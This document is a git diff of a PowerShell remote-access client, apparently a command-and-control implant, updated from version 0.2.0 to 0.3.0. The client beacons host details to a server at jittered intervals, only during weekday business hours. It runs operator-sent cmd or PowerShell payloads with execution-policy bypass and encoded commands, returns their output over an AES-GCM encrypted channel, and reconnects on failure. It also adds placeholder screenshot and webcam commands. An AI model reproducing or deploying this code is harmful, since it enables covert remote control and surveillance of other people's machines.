@@ -1,289 +1,429 @@
 # Globals
+$global:client = $null
 $global:beaconIntervalInstance = $null
 $global:logStream = $null
-$global:startTime = Get-Date
+$global:startTime = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
 $global:exitProcess = $false
+$global:SESSION_ID = $null
 $global:LOGGING = $true
-$global:CVER = "0.2.0"
+$global:CVER = "0.3.0"
 $global:TYPE = "ps"
 $global:CHUNK_SIZE = 1024
 $global:SERVER_ADDRESS = 'localhost'
 $global:SERVER_PORT = 54678
 $global:MAX_RETRIES = 5
-$global:RETRY_INTERVALS = @(10000, 30000, 60000, 120000, 240000, 360000)
-$global:BEACON_MIN_INTERVAL = 300000  # 5 minutes
-$global:BEACON_MAX_INTERVAL = 2700000  # 45 minutes
-$global:client = $null
+$global:RETRY_INTERVALS = @(
+    [uint32]10000,
+    [uint32]30000,
+    [uint32](1 * 60 * 1000),
+    [uint32](2 * 60 * 1000),
+    [uint32](4 * 60 * 1000),
+    [uint32](6 * 60 * 1000)
+)
+$global:BEACON_MIN_INTERVAL = 5 * 60 * 1000
+$global:BEACON_MAX_INTERVAL = 45 * 60 * 1000
 
-# Create a writable stream for logging
-if ($global:LOGGING) {
-    $global:logStream = [System.IO.StreamWriter]::new("logs\client.log", $true)
-}
-
-# Log it
-function Log-It {
-    param ([string]$message)
-    if ($global:LOGGING -and $global:logStream) {
-        $timestamp = (Get-Date).ToString("o")
-        $global:logStream.WriteLine("[$timestamp] $message")
-    }
-}
-
-# Clean up resources on exit
-function Cleanup {
-    Log-It "Received SIGINT, shutting down gracefully"
+# Handle SIGINT (Ctrl+C)
+$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
+    Log-It 'Received exit signal, shutting down gracefully'
     if ($global:client) {
         $global:client.Close()
     }
     $global:exitProcess = $true
-    Exit
 }
 
-# Trap Ctrl+C (SIGINT) to cleanup
-trap {
-    Cleanup
+$null = Register-ObjectEvent -InputObject ([Console]) -EventName CancelKeyPress -Action {
+    Log-It 'Received SIGINT (Ctrl+C), shutting down gracefully'
+    if ($global:client) {
+        $global:client.Close()
+    }
+    $global:exitProcess = $true
+    [Environment]::Exit(0)
 }
 
-# Get session ID
+# Create a writable stream for logging
+if ($global:LOGGING) {
+    $logPath = 'logs\client.log'
+    $logDir = [System.IO.Path]::GetDirectoryName($logPath)
+    if (-not (Test-Path -Path $logDir)) {
+        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
+    }
+    $global:logStream = New-Object System.IO.StreamWriter($logPath, $true)
+}
+
+function Log-It {
+    param (
+        [string]$message
+    )
+    if ($global:LOGGING -and $global:logStream) {
+        $timestamp = (Get-Date).ToUniversalTime().ToString("o")
+        $global:logStream.WriteLine("[$timestamp] $message")
+        $global:logStream.Flush()
+    }
+}
+
 function Get-SessionId {
-    $ipAddress = $global:client.Client.RemoteEndPoint.Address.ToString()
-    $sum = $ipAddress.Split('.') | ForEach-Object { [int]$_ } | Measure-Object -Sum | Select-Object -ExpandProperty Sum
-    $sessionId = [BitConverter]::ToString((New-Object Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$ipAddress<>$sum"))).Replace("-", "").Substring(0, 32)
-    return $sessionId
+    try {
+        if (-not $global:client -or -not $global:client.Client -or -not $global:client.Client.RemoteEndPoint) {
+            throw [Exception]::new("Client is not properly initialized.")
+        }
+        $ipAddress = $global:client.Client.RemoteEndPoint.Address.ToString()
+        if ($ipAddress -eq "::1") {
+            $ipAddress = "127.0.0.1"
+        }
+        Log-It "IP Address: $ipAddress"
+        $sumIp = 0
+        $ipAddress.Split(".") | ForEach-Object {
+            $sumIp += [int]$_
+        }
+        $hashObject = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("$ipAddress<>$sumIp"))
+        $crypt = [BitConverter]::ToString($hashObject).Replace("-", "").Substring(0, 32).ToLower()
+        $global:SESSION_ID = $crypt
+        Log-It "Session ID: $global:SESSION_ID"
+    } catch {
+        Log-It "Error getting session ID: $_"
+    }
 }
 
-# Encrypt data
 function Encrypt-Data {
     param (
         [string]$data,
         [string]$sharedKey
     )
-    $salt = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(16)
-    $key = [System.Security.Cryptography.Pbkdf2]::DeriveKey([System.Text.Encoding]::UTF8.GetBytes($sharedKey), $salt, 200000, 32, 'SHA512')
-    $iv = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(12)
-    $cipher = [System.Security.Cryptography.AesGcm]::new($key)
-    $encryptedData = [System.Security.Cryptography.CipherStream]::new($cipher, $iv)
-    $encryptedData.Write([System.Text.Encoding]::UTF8.GetBytes($data))
-    $encryptedData.FlushFinalBlock()
-    $authTag = $cipher.GetAuthTag()
-    return "{0}:{1}:{2}:{3}" -f ([Convert]::ToBase64String($salt)), ([Convert]::ToBase64String($iv)), ([Convert]::ToBase64String($authTag)), ([Convert]::ToBase64String($encryptedData))
+    try {
+        $salt = [byte[]]::new(32)
+        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)
+        $iv = [byte[]]::new(12)
+        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)
+        $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
+            $sharedKey, 
+            $salt, 
+            200000, 
+            [System.Security.Cryptography.HashAlgorithmName]::SHA512
+        ).GetBytes(32)
+        $aes = [System.Security.Cryptography.AesGcm]::new($key)
+        $dataBytes = [Text.Encoding]::UTF8.GetBytes($data)
+        $ciphertext = [byte[]]::new($dataBytes.Length)
+        $authTag = [byte[]]::new(16)
+        $aes.Encrypt($iv, $dataBytes, $ciphertext, $authTag)
+        $saltBase64 = [Convert]::ToBase64String($salt)
+        $ivBase64 = [Convert]::ToBase64String($iv)
+        $authTagBase64 = [Convert]::ToBase64String($authTag)
+        $ciphertextBase64 = [Convert]::ToBase64String($ciphertext)
+        return "${saltBase64}:${ivBase64}:${authTagBase64}:${ciphertextBase64}"
+    }
+    catch {
+        Write-Error "Error in Encrypt-Data: $_"
+        throw
+    }
 }
 
-# Decrypt data
 function Decrypt-Data {
     param (
         [string]$encrypted,
         [string]$sharedKey
     )
-    $parts = $encrypted -split ':'
-    $salt = [Convert]::FromBase64String($parts[0])
-    $iv = [Convert]::FromBase64String($parts[1])
-    $authTag = [Convert]::FromBase64String($parts[2])
-    $encryptedData = [Convert]::FromBase64String($parts[3])
-    $key = [System.Security.Cryptography.Pbkdf2]::DeriveKey([System.Text.Encoding]::UTF8.GetBytes($sharedKey), $salt, 200000, 32, 'SHA512')
-    $cipher = [System.Security.Cryptography.AesGcm]::new($key)
-    $cipher.SetAuthTag($authTag)
-    $decryptedData = [System.Security.Cryptography.CipherStream]::new($cipher, $iv)
-    $decryptedData.Write($encryptedData)
-    $decryptedData.FlushFinalBlock()
-    return [System.Text.Encoding]::UTF8.GetString($decryptedData)
+    try {
+        $parts = $encrypted -split ':'
+        if ($parts.Length -ne 4) {
+            throw "Invalid encrypted data format."
+        }
+        $salt = [Convert]::FromBase64String($parts[0])
+        $iv = [Convert]::FromBase64String($parts[1])
+        $authTag = [Convert]::FromBase64String($parts[2])
+        $encryptedData = [Convert]::FromBase64String($parts[3])
+        $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
+            $sharedKey, 
+            $salt, 
+            200000, 
+            [System.Security.Cryptography.HashAlgorithmName]::SHA512
+        ).GetBytes(32)
+        $aes = [System.Security.Cryptography.AesGcm]::new($key)
+        $plaintext = [byte[]]::new($encryptedData.Length)
+        $aes.Decrypt($iv, $encryptedData, $authTag, $plaintext)
+        return [Text.Encoding]::UTF8.GetString($plaintext)
+    }
+    catch {
+        Write-Error "Error in Decrypt-Data: $_"
+        throw
+    }
 }
 
-# Get retry interval
 function Get-RetryInterval {
-    param ([int]$retries)
-    return if ($retries -lt $global:RETRY_INTERVALS.Length) { $global:RETRY_INTERVALS[$retries] } else { 0 }
+    param ($retries)
+    if ($retries -lt $global:RETRY_INTERVALS.Length) {
+        return $global:RETRY_INTERVALS[$retries]
+    }
+    return 0
 }
 
-# Send command
 function Send-Command {
-    param ([hashtable]$response)
-    $sessionId = Get-SessionId
-    $encrypted = Encrypt-Data -data (ConvertTo-Json -InputObject $response) -sharedKey $sessionId
+    param ($response)
+    $encrypted = Encrypt-Data -data $response -sharedKey $global:SESSION_ID
     if ($encrypted.Length -ge $global:CHUNK_SIZE) {
         while ($encrypted.Length -gt 0) {
-            $chunk = $encrypted.Substring(0, $global:CHUNK_SIZE)
-            $encrypted = $encrypted.Substring($global:CHUNK_SIZE)
+            $chunk = $encrypted.Substring(0, [Math]::Min($global:CHUNK_SIZE, $encrypted.Length))
+            $encrypted = $encrypted.Substring($chunk.Length)
             if ($encrypted.Length -eq 0) {
-                $chunk += "--END--"
+                $chunk += '--FIN--'
             }
             Log-It "Sent Chunk: $chunk"
-            $global:client.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($chunk))
+            $global:client.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($chunk), 0, $chunk.Length)
         }
-    } else {
+    }
+    else {
         Log-It "Sent Data: $encrypted"
-        $global:client.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($encrypted))
+        $global:client.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($encrypted), 0, $encrypted.Length)
     }
 }
 
-# Send beacon
 function Send-Beacon {
-    Send-Command -response @{ response = @{ beacon = $true; version = $global:CVER; type = $global:TYPE }}
-}
-
-# Sleep function
-function Sleep-Async {
-    param ([int]$ms)
-    Start-Sleep -Milliseconds $ms
-}
-
-# UTF8 to UTF16
-function Utf8To16 {
-    param ([string]$str)
-    $buffer = New-Object byte[] ($str.Length * 2)
-    for ($i = 0; $i -lt $str.Length; $i++) {
-        [System.BitConverter]::GetBytes([int][char]$str[$i]).CopyTo($buffer, $i * 2)
+    $response = @{
+        response = @{
+            beacon = $true
+            version = $global:CVER
+            type = $global:TYPE
+            platform = [System.Environment]::OSVersion.Platform.ToString()
+            arch = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
+            osver = [System.Environment]::OSVersion.VersionString
+            hostname = [System.Environment]::MachineName
+        }
     }
-    return $buffer
+    Send-Command -response $response
 }
 
-# Run command
-function Run-Command {
-    param (
-        [string]$command,
-        [string]$payload,
-        [bool]$isFile = $false
-    )
+function Start-Sleep {
+    param ([int]$milliseconds)
+    [System.Threading.Thread]::Sleep($milliseconds)
+}
+
+function Format-FileName {
+    param ($name, $extension)
+    $now = Get-Date
+    return "$name`_$($now.ToString('yyyy-MM-dd_HH-mm-ss')).$($extension -replace '\.', '')"
+}
+
+function Run-WebcamClip {
     try {
-        if (-not $command) {
+        # Placeholder for webcam capture
+        $fileName = Format-FileName -name 'wc' -extension 'jpg'
+        # Simulate webcam capture
+        [byte[]]$fakeImageData = [System.Text.Encoding]::UTF8.GetBytes("Fake webcam image data")
+        Send-Command @{
+            response = @{
+                download = $fileName
+                data = [Convert]::ToBase64String($fakeImageData)
+            }
+        }
+    }
+    catch {
+        Send-Command @{
+            response = @{
+                error = "Failed to capture webcam: $($_.Exception.Message)"
+            }
+        }
+    }
+}
+
+function Run-Screenshot {
+    try {
+        # Placeholder for screenshot capture
+        $fileName = Format-FileName -name 'ss' -extension 'jpg'
+        # Simulate screenshot capture
+        [byte[]]$fakeScreenshotData = [System.Text.Encoding]::UTF8.GetBytes("Fake screenshot data")
+        Send-Command @{
+            response = @{
+                download = $fileName
+                data = [Convert]::ToBase64String($fakeScreenshotData)
+            }
+        }
+    }
+    catch {
+        Send-Command @{
+            response = @{
+                error = "Failed to capture screenshot: $($_.Exception.Message)"
+            }
+        }
+    }
+}
+
+function Run-Command {
+    param ($command, $payload, $isFile = $false)
+    try {
+        $command = $command.Trim()
+        if ([string]::IsNullOrWhiteSpace($command)) {
             throw "No command provided."
         }
         if ($command -notin @('cmd', 'ps')) {
             throw "Unsupported command."
         }
-        $argus = @()
-        switch ($command) {
-            'cmd' {
-                if ($payload -match '[;&]') {
-                    throw "Invalid characters in payload."
-                }
-                $argus = @('/c', $payload)
-                $command = "cmd.exe"
+        $processArgs = @{
+            FilePath = if ($command -eq "cmd") { "cmd.exe" } else { "powershell.exe" }
+            ArgumentList = @()
+            NoNewWindow = $true
+            Wait = $true
+            RedirectStandardOutput = "out.txt"
+            RedirectStandardError = "err.txt"
+        }
+        if ($command -eq "cmd") {
+            if ($payload -match '[;&|]') {
+                throw "Invalid characters in payload."
             }
-            'ps' {
-                $argus = @('-NonInteractive', '-NoLogo', '-NoProfile', '-WindowStyle', 'hidden', '-ExecutionPolicy', 'Bypass')
-                if ($isFile) {
-                    $argus += @('-File', $payload)
-                } else {
-                    $encodedCmd = [Convert]::ToBase64String((Utf8To16 -str $payload))
-                    $argus += @('-EncodedCommand', $encodedCmd)
-                }
-                $command = "powershell.exe"
+            $processArgs.ArgumentList += @('/c', $payload)
+        }
+        else {
+            $processArgs.ArgumentList += @(
+                '-NonInteractive',
+                '-NoLogo',
+                '-NoProfile',
+                '-ExecutionPolicy', 'Bypass'
+            )
+            if ($isFile) {
+                $processArgs.ArgumentList += @('-File', $payload)
+            }
+            else {
+                $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
+                $processArgs.ArgumentList += @('-EncodedCommand', $encodedCmd)
             }
         }
-        $process = New-Object System.Diagnostics.Process
-        $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo
-        $process.StartInfo.FileName = $command
-        $process.StartInfo.Arguments = $argus -join " "
-        $process.StartInfo.RedirectStandardOutput = $true
-        $process.StartInfo.RedirectStandardError = $true
-        $process.StartInfo.UseShellExecute = $false
-        $process.StartInfo.CreateNoWindow = $true
-        $process.Start() | Out-Null
-        $output = $process.StandardOutput.ReadToEnd() + $process.StandardError.ReadToEnd()
-        $process.WaitForExit()
+        $process = Start-Process @processArgs -PassThru
+        $process | Wait-Process
+        $output = Get-Content -Path "out.txt" -Raw
+        $errorOutput = Get-Content -Path "err.txt" -Raw
+        
         if ($process.ExitCode -ne 0) {
-            throw "Command failed with code $($process.ExitCode). Error output: $output"
+            throw "Command failed with code $($process.ExitCode). Error output: $errorOutput"
         }
+        
         return $output.Trim()
-    } catch {
-        throw "Failed to execute command: $_"
+    }
+    catch {
+        throw "Failed to execute command: $($_.Exception.Message)"
+    }
+    finally {
+        Remove-Item -Path "out.txt", "err.txt" -ErrorAction SilentlyContinue
     }
 }
 
-# Format time
 function Format-Time {
     param ([int]$milliseconds)
-    $totalSeconds = [int]($milliseconds / 1000)
-    $days = [int]($totalSeconds / 86400)
-    $hours = [int](($totalSeconds % 86400) / 3600)
-    $minutes = [int](($totalSeconds % 3600) / 60)
+    $totalSeconds = [Math]::Floor($milliseconds / 1000)
+    $days = [Math]::Floor($totalSeconds / 86400)
+    $hours = [Math]::Floor(($totalSeconds % 86400) / 3600)
+    $minutes = [Math]::Floor(($totalSeconds % 3600) / 60)
     $seconds = $totalSeconds % 60
     return "$days`d $hours`h $minutes`m $seconds`s"
 }
 
-# Get uptime
 function Get-Uptime {
-    $currentTime = Get-Date
-    $uptimeMillis = ($currentTime - $global:startTime).TotalMilliseconds
-    return Format-Time -milliseconds $uptimeMillis
+    $currentTime = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
+    $uptimeMillis = $currentTime - $global:startTime
+    $uptime = Format-Time -milliseconds $uptimeMillis
+    Send-Command @{ response = @{ data = $uptime } }
 }
 
-# Parse action
 function Parse-Action {
-    param ([string]$action)
+    param ($action)
     try {
-        $parts = $action.Trim() -split ' +(?=(?:[^"]*"[^"]*")*[^"]*$)'  # Split by whitespace but ignore spaces within double quotes
-        $command = $parts[0]
-        $properties = $parts[1..($parts.Length - 1)]
-        
+        $parts = $action.Trim() -split '\s+(?=(?:[^"]*"[^"]*")*[^"]*$)'
+        $command, $properties = $parts[0], $parts[1..$parts.Length]
         Log-It "Command: $command - Properties: $($properties -join ' ')"
-        
-        if ($command -eq 'ps' -or $command -eq 'cmd') {
-            $payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($properties[0]))
-            $result = Run-Command -command $command -payload $payload
-            Send-Command -response @{ response = @{ data = $result }}
-        }
-        elseif ($command -eq 'up') {
-            $uptime = Get-Uptime
-            Send-Command -response @{ response = @{ data = $uptime }}
-        }
-        elseif ($command -eq 'die') {
-            $global:exitProcess = $true
-            Exit
-        }
-        else {
-            throw "Unknown command: $command"
-        }
-    }
-    catch {
-        Send-Command -response @{ response = @{ error = "Error: $_" }}
-    }
-}
-
-# Connect to server function
-function Connect-To-Server {
-    try {
-        $global:client = New-Object System.Net.Sockets.TcpClient
-        $global:client.Connect($global:SERVER_ADDRESS, $global:SERVER_PORT)
-        
-        Log-It "Client $($global:CVER) connected."
-        Send-Beacon
-        
-        # Set random beacon interval
-        $beaconInterval = Get-Random -Minimum $global:BEACON_MIN_INTERVAL -Maximum $global:BEACON_MAX_INTERVAL
-        $global:beaconIntervalInstance = [System.Timers.Timer]::new($beaconInterval)
-        $global:beaconIntervalInstance.AutoReset = $true
-        $global:beaconIntervalInstance.Elapsed += {
-            $now = Get-Date
-            $day = $now.DayOfWeek.value__
-            $hour = $now.Hour
-            # Check if the current day is Monday through Friday (1-5) and the hour is between 7 AM and 7 PM (inclusive)
-            if ($day -ge 1 -and $day -le 5 -and $hour -ge 7 -and $hour -le 19) {
-                Send-Beacon
+        $payload = $null
+        switch ($command) {
+            { $_ -in 'ps', 'cmd' } {
+                $payload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($properties[0]))
+            }
+            'up' {
+                Get-Uptime
+                return
+            }
+            'di' {
+                $global:exitProcess = $true
+                exit
+            }
+            'ss' {
+                Run-Screenshot
+                return
+            }
+            'wc' {
+                Run-WebcamClip
+                return
             }
         }
-        $global:beaconIntervalInstance.Start()
-        
-        # Listen for server commands
-        $stream = $global:client.GetStream()
-        $reader = [System.IO.StreamReader]::new($stream)
-        
-        while ($true) {
-            $data = $reader.ReadLine()
-            if ($data -ne $null) {
+        $result = Run-Command -command $command -payload $payload
+        Send-Command @{ response = @{ data = $result } }
+    }
+    catch {
+        Send-Command @{ response = @{ error = "Error: $($_.Exception.Message)" } }
+    }
+}
+
+function Connect-ToServer {
+    $connectionRetries = 0
+    $shouldContinue = $true
+
+    while ($shouldContinue) {
+        try {
+            $global:client = New-Object System.Net.Sockets.TcpClient
+            $global:client.Connect($global:SERVER_ADDRESS, $global:SERVER_PORT)
+            Log-It "Client $global:CVER connected."
+            Get-SessionId
+            Send-Beacon
+            $beaconInterval = Get-Random -Minimum $global:BEACON_MIN_INTERVAL -Maximum $global:BEACON_MAX_INTERVAL
+            $global:beaconIntervalInstance = New-Object System.Timers.Timer($beaconInterval)
+            $global:beaconIntervalInstance.AutoReset = $true
+            $global:beaconIntervalInstance.Enabled = $true
+            Register-ObjectEvent -InputObject $global:beaconIntervalInstance -EventName Elapsed -Action {
+                $now = Get-Date
+                $day = $now.DayOfWeek.value__
+                $hour = $now.Hour
+                if ($day -ge 1 -and $day -le 5 -and $hour -ge 7 -and $hour -le 19) {
+                    Send-Beacon
+                }
+            } | Out-Null
+            $stream = $global:client.GetStream()
+            $buffer = New-Object byte[] $global:CHUNK_SIZE
+            while ($true) {
+                $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+                if ($bytesRead -eq 0) { break }
+                $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
                 Log-It "Received Data: $data"
-                $action = Decrypt-Data -encrypted $data
+                $action = Decrypt-Data -encrypted $data -sharedKey $global:SESSION_ID
                 if ($action) {
                     Parse-Action -action $action
                 }
             }
         }
-    }
-    catch {
-        Log-It "Exception: $_"
+        catch {
+            Log-It "Exception: $($_.Exception.Message)"
+        }
+        finally {
+            Log-It 'Connection to server closing.'
+            if ($global:beaconIntervalInstance) {
+                $global:beaconIntervalInstance.Stop()
+                $global:beaconIntervalInstance.Dispose()
+            }
+            if ($global:exitProcess) {
+                $shouldContinue = $false
+            }
+            else {
+                $connectionRetries++
+                if ($connectionRetries -gt $global:MAX_RETRIES) {
+                    Log-It 'Max retries reached. Exiting.'
+                    Start-Sleep -Milliseconds ($global:BEACON_MAX_INTERVAL * 8)
+                    $shouldContinue = $false
+                }
+                else {
+                    $retryInterval = Get-RetryInterval -retries $connectionRetries
+                    Log-It "Attempting to reconnect in $($retryInterval / 1000) seconds..."
+                    Start-Sleep -Milliseconds $retryInterval
+                    if ($global:client) {
+                        $global:client.Close()
+                    }
+                }
+            }
+        }
     }
 }
 
-# Start client
-Connect-To-Server
+Connect-ToServer
